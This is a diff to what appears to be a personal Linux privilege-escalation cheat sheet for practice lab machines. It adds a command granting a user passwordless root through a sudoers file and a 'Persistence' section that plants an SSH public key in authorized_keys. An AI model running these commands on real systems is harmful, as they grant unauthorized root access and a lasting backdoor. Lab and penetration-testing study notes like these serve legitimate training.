@@ -108,7 +108,9 @@ su root2
 
 Add user to sudoers
 ```
+echo '<user> ALL=(ALL:ALL) NOPASSWD:ALL' > /etc/sudoers.d/<user>
 
+chmod 440 /etc/sudoers.d/<user>
 ```
 
 ## Disk group
@@ -135,3 +137,13 @@ debugfs <filesystem>
 ```
 
 boxes: Extplorer (PG practice)
+
+## Persistence
+
+```
+mkdir -p /home/<user>/.ssh
+echo 'YOUR_PUBLIC_KEY_HERE' >> /home/<user>/.ssh/authorized_keys
+chown -R <user>:<user> /home/<user>/.ssh
+chmod 700 /home/<user>/.ssh
+chmod 600 /home/<user>/.ssh/authorized_keys
+```
